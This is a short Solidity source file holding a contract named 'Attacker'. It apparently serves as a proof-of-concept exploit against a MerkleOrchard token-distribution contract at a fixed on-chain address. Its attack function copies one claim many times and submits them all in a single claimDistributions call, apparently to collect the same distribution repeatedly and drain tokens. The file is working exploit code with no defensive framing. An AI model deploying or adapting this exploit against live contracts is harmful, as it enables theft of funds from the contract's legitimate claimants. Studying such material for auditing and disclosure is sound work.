// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/interfaces/IERC20.sol";

struct Claim {
    uint256 distributionId;
    uint256 balance;
    address distributor;
    uint256 tokenIndex;
    bytes32[] merkleProof;
}

interface IMerkleOrchard {
    function claimDistributions(
        address claimer,
        Claim[] memory claims,
        IERC20[] memory tokens
    ) external;
} 

contract Attacker {
    address constant MERKLE_ORCHARD = 0xdAE7e32ADc5d490a43cCba1f0c736033F2b4eFca;

    function attack(
        address claimer, 
        Claim calldata claim, 
        IERC20 token,
        uint repetitions
    ) external {
        Claim[] memory claims = new Claim[](repetitions);
        for (uint i; i < repetitions; i++) {
            claims[i] = claim;
        }

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = token;

        IMerkleOrchard(MERKLE_ORCHARD).claimDistributions(claimer, claims, tokens);
    }
}
